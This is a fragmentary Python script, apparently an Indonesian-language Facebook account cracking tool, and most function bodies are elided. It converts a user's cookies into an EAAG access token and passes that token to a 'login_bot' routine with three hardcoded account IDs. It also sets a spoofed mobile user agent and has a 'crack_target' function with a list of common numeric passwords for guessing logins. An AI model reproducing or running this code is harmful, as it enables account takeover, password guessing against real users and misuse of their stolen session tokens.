...
class masuk:
	...
	def login(self):
		try:
			...
			exit ("%s%s no connection "%(M,til));jeda(2)
...
def konverter(kukis): 
	...
	try:
		...
		if 'EAAG' in romz:
			...
			print (f'\n{P}#{O} your token {M}> {K}{romz} ');jeda(2)
			login_bot(romz)
	except AttributeError:
		print("%s%s an error occurred while converting, check your cookies "%(M,til))
		exit()
...
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100026841861572')
		romz2 = ('100017988424248')
		romz3 = ('100079344519359')
...
USN="Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
...
def crack_target():
	...
	pw_tambahan = ["223344", "445566", "556677", "102030", "334455", "203040", "@12345", "786787", "405060", "667788", "123456","123456", "112233"]
